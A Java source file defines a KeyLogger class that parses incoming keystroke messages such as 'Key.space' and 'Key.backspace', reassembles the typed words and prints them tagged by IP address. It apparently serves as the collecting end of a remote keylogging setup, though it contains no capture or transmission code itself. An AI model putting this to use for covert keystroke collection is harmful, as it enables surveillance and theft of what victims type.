package org.whatever.library.logger;


import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class KeyLogger {

    protected String id;
    protected List<String> words;
    private String nonCharacterRegex;
    private Pattern pattern;
    private Matcher matcher;
    private StringBuilder word;

    public KeyLogger(String id) {
        words = new ArrayList<>();
        this.id = id;
        nonCharacterRegex = "Key\\.[a-z_]+";
        pattern = Pattern.compile(nonCharacterRegex);
        word = new StringBuilder();
    }

    public void processMessage(String message) {

        matcher = pattern.matcher(message);

        if (matcher.matches()) {
            if (message.contains("Key.space") || message.contains("Key.enter"))
                saveWord(word);
            if (message.contains("Key.backspace")) {
                if (word.length() > 0)
                    word.setLength(word.length() - 1);
            }
        } else {
            word.append(message);
        }
    }

    public String getId() {
        return id;
    }

    public List<String> getWords() {
        return words;
    }

    private void saveWord(StringBuilder word) {
        words.add(word.toString());
        System.out.println(String.format("IP: %s, Message: %s", id, word.toString()));
        word.setLength(0);
    }

}
